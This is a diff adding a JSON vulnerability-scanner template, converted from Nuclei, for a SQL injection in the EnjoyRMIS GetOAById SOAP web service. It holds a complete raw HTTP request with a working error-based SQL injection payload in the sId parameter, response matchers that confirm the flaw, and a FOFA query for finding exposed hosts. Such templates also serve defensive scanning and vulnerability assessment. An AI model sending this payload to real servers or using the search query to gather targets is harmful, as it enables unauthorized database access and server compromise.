@@ -1,0 +1,119 @@
+{
+  "id": "enjoyrmis-sqli",
+  "name": "EnjoyRMIS - SQL Injection",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "enjoyrmis",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"CheckSilverlightInstalled\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset\u003dutf-8\nSOAPAction: \"http://tempuri.org/GetOAById\"\n\n\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\"?\u003e\n\u003csoap:Envelope xmlns:xsi\u003d\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd\u003d\"http://www.w3.org/2001/XMLSchema\" xmlns:soap\u003d\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\n  \u003csoap:Body\u003e\n    \u003cGetOAById xmlns\u003d\"http://tempuri.org/\"\u003e\n      \u003csId\u003estring\u0027 AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448\u003d8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND \u0027OFyo\u0027\u003d\u0027OFyo\u003c/sId\u003e\n    \u003c/GetOAById\u003e\n  \u003c/soap:Body\u003e\n\u003c/soap:Envelope\u003e\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body,\"qqqzq1qvkqq\")",
+            "contains(header,\"text/xml\")",
+            "status_code \u003d\u003d 500"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "enjoyrmis-sqli",
+    "info": {
+      "name": "EnjoyRMIS - SQL Injection",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "body\u003d\"CheckSilverlightInstalled\""
+      },
+      "tags": "enjoyrmis,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset\u003dutf-8\nSOAPAction: \"http://tempuri.org/GetOAById\"\n\n\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\"?\u003e\n\u003csoap:Envelope xmlns:xsi\u003d\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd\u003d\"http://www.w3.org/2001/XMLSchema\" xmlns:soap\u003d\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\n  \u003csoap:Body\u003e\n    \u003cGetOAById xmlns\u003d\"http://tempuri.org/\"\u003e\n      \u003csId\u003estring\u0027 AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448\u003d8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND \u0027OFyo\u0027\u003d\u0027OFyo\u003c/sId\u003e\n    \u003c/GetOAById\u003e\n  \u003c/soap:Body\u003e\n\u003c/soap:Envelope\u003e\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body,\"qqqzq1qvkqq\")",
+              "contains(header,\"text/xml\")",
+              "status_code \u003d\u003d 500"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
